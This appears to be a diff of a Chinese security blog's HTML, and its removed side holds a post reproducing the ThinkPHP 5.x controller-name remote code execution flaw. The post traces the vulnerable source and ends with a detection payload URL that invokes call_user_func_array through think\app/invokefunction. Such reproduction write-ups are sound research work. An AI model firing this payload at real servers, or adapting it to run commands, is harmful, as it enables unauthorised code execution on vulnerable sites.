@@ -4,22 +4,15 @@
   <meta charset="utf-8">
   
   
-  <title>tp5rce复现 | oxcccccc</title>
+  <title>Tag: ctf | oxcccccc</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="tp5rce复现影响范围 本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0.23和5.1.31之前的所有版本，推荐尽快更新到最新版本。如果暂时无法更新到最新版本，请开启强制路由并添加相应未定义路由，或者参考commit的修改 增加相关代码。 –来自thinkphp官网  漏洞原理根据官方的公告去">
-<meta property="og:type" content="article">
-<meta property="og:title" content="tp5rce复现">
-<meta property="og:url" content="https:&#x2F;&#x2F;explorersss.github.io&#x2F;2020&#x2F;01&#x2F;28&#x2F;tp5rce%E5%A4%8D%E7%8E%B0&#x2F;index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="oxcccccc">
+<meta property="og:url" content="https:&#x2F;&#x2F;explorersss.github.io&#x2F;tags&#x2F;ctf&#x2F;page&#x2F;2&#x2F;index.html">
 <meta property="og:site_name" content="oxcccccc">
-<meta property="og:description" content="tp5rce复现影响范围 本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0.23和5.1.31之前的所有版本，推荐尽快更新到最新版本。如果暂时无法更新到最新版本，请开启强制路由并添加相应未定义路由，或者参考commit的修改 增加相关代码。 –来自thinkphp官网  漏洞原理根据官方的公告去">
 <meta property="og:locale" content="zh">
-<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;01&#x2F;28&#x2F;5EDWfFXvmqSuJk3.png">
-<meta property="article:published_time" content="2020-01-28T07:33:24.775Z">
-<meta property="article:modified_time" content="2020-01-30T07:36:55.501Z">
 <meta property="article:author" content="ccreater">
-<meta property="article:tag" content="cve复现">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;01&#x2F;28&#x2F;5EDWfFXvmqSuJk3.png">
   
     <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
   
@@ -71,132 +64,45 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-tp5rce复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/01/28/tp5rce%E5%A4%8D%E7%8E%B0/" class="article-date">
-  <time class="dt-published" datetime="2020-01-28T07:33:24.775Z" itemprop="datePublished">2020-01-28</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
+        <section id="main">
   
-    <h1 class="p-name article-title" itemprop="headline name">
-      tp5rce复现
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2019" class="archive-year">2019</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      <a href="/2019/12/16/pickle/" class="archive-article-date">
+  <time class="dt-published" datetime="2019-12-15T16:41:19.602Z" itemprop="datePublished">Dec 16</time>
+</a>
+      
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2019/12/16/pickle/">python  pickle 入门</a>
     </h1>
   
 
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="tp5rce复现"><a href="#tp5rce复现" class="headerlink" title="tp5rce复现"></a>tp5rce复现</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><blockquote>
-<h3 id="本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5-0-23和5-1-31之前的所有版本，推荐尽快更新到最新版本。"><a href="#本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5-0-23和5-1-31之前的所有版本，推荐尽快更新到最新版本。" class="headerlink" title="本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0.23和5.1.31之前的所有版本，推荐尽快更新到最新版本。"></a>本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0.23和5.1.31之前的所有版本，推荐尽快更新到最新版本。</h3><p><strong>如果暂时无法更新到最新版本，请开启强制路由并添加相应未定义路由，或者参考commit的修改 增加相关代码。</strong></p>
-<p>–来自thinkphp官网</p>
-</blockquote>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>根据官方的公告去寻找相关commit发现漏洞位置</p>
-<p><img src="https://i.loli.net/2020/01/28/5EDWfFXvmqSuJk3.png" alt="image302"></p>
-<p>查看所有调用controller的函数发现有个敏感的函数名exec,不过这个是tp自己实现的</p>
-<pre><code class="php">    public function exec()
-    {
-        // 监听module_init
-        $this-&gt;app[&#39;hook&#39;]-&gt;listen(&#39;module_init&#39;);
-
-        try {
-            // 实例化控制器
-            $instance = $this-&gt;app-&gt;controller($this-&gt;controller,
-                $this-&gt;rule-&gt;getConfig(&#39;url_controller_layer&#39;),
-                $this-&gt;rule-&gt;getConfig(&#39;controller_suffix&#39;),
-                $this-&gt;rule-&gt;getConfig(&#39;empty_controller&#39;));
-
-            if ($instance instanceof Controller) {
-                $instance-&gt;registerMiddleware();
-            }
-        } catch (ClassNotFoundException $e) {
-            throw new HttpException(404, &#39;controller not exists:&#39; . $e-&gt;getClass());
-        }
-    ...
-    }</code></pre>
-<p>跟进controller</p>
-<pre><code class="php">    public function controller($name, $layer = &#39;controller&#39;, $appendSuffix = false, $empty = &#39;&#39;)
-    {
-        list($module, $class) = $this-&gt;parseModuleAndClass($name, $layer, $appendSuffix);
-
-        if (class_exists($class)) {
-            return $this-&gt;__get($class);
-        } elseif ($empty &amp;&amp; class_exists($emptyClass = $this-&gt;parseClass($module, $layer, $empty, $appendSuffix))) {
-            return $this-&gt;__get($emptyClass);
-        }
-
-        throw new ClassNotFoundException(&#39;class not exists:&#39; . $class, $class);
-    }</code></pre>
-<p>再跟进parseModuleAndClass</p>
-<pre><code class="php">protected function parseModuleAndClass($name, $layer, $appendSuffix)
-    {
-        if (false !== strpos($name, &#39;\\&#39;)) {
-            $class  = $name;//存在\
-            $module = $this-&gt;request-&gt;module();
-        } else {
-            if (strpos($name, &#39;/&#39;)) {
-                list($module, $name) = explode(&#39;/&#39;, $name, 2);
-            } else {
-                $module = $this-&gt;request-&gt;module();
-            }
-
-            $class = $this-&gt;parseClass($module, $layer, $name, $appendSuffix);
-        }
-
-        return [$module, $class];
-    }</code></pre>
-<p>如果存在\则直接返回数据,其中<code>$name</code>是我们可控内容,而<code>$name</code>也恰好是类名,于是我们可以通过调用命名空间\类来进行敏感操作</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>查找手册,找到url访问的具体细节</p>
-<p><code>http://serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[参数名/参数值...]</code></p>
-<p>于是有通杀tp5.0.x和tp5.1.x的检测payload</p>
-<p><code>http://127.0.0.1/public/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=var_dump&amp;vars[1][]=checktp5rce</code></p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2020/01/28/tp5rce复现/">https://explorersss.github.io/2020/01/28/tp5rce复现/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://explorersss.github.io/2020/01/28/tp5rce%E5%A4%8D%E7%8E%B0/" data-id="ck5xkdwm00000l4v0hfq6g9v1" data-title="tp5rce复现" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
-
-    </footer>
+    </header>
   </div>
-  
-    
-<nav id="article-nav">
-  
-    <a href="/2020/01/30/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2020/01/25/coursera-%E6%9D%9C%E5%85%8B%E5%A4%A7%E5%AD%A6%20%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E4%B8%8E%20Web%20%E5%85%A5%E9%97%A8/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">coursera-杜克大学 程序设计与 Web 入门</div>
-    </a>
-  
-</nav>
-
-  
 </article>
+  
+  
+    </div></section>
+  
 
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/tags/ctf/">&lt;- Prev</a><a class="page-number" href="/tags/ctf/">1</a><span class="page-number current">2</span>
+  </nav>
 
 </section>
         
